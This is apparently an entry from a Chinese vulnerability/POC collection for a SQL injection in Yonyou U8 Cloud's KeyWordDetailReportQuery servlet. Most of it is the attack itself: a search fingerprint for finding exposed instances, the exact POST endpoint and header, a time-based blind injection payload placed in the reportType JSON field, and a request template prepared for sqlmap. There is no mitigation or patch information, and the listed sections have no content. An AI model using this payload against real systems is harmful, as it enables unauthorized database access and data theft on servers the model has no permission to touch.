# 用友U8CloudKeyWordDetailReportQuery存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`POST /servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery HTTP/1.1`
- **关键头**：`Content-Type: application/json`

**请求体 / payload**
```
{"reportType":"';WAITFOR DELAY '0:0:5'--","usercode":"18701014496","keyword":[{"keywordPk":"1","keywordValue":"1","keywordIndex":1}]}

sqlmap
POST /servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery HTTP/1.1
Host:
Content-Type: application/json
{"reportType":"","usercode":"18701014496","keyword":[{"keywordPk":"1","keywordValue":"1","keywordIndex":1}]}
```

**其他**
- 用友U8 Cloud KeyWordDetailReportQuery存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud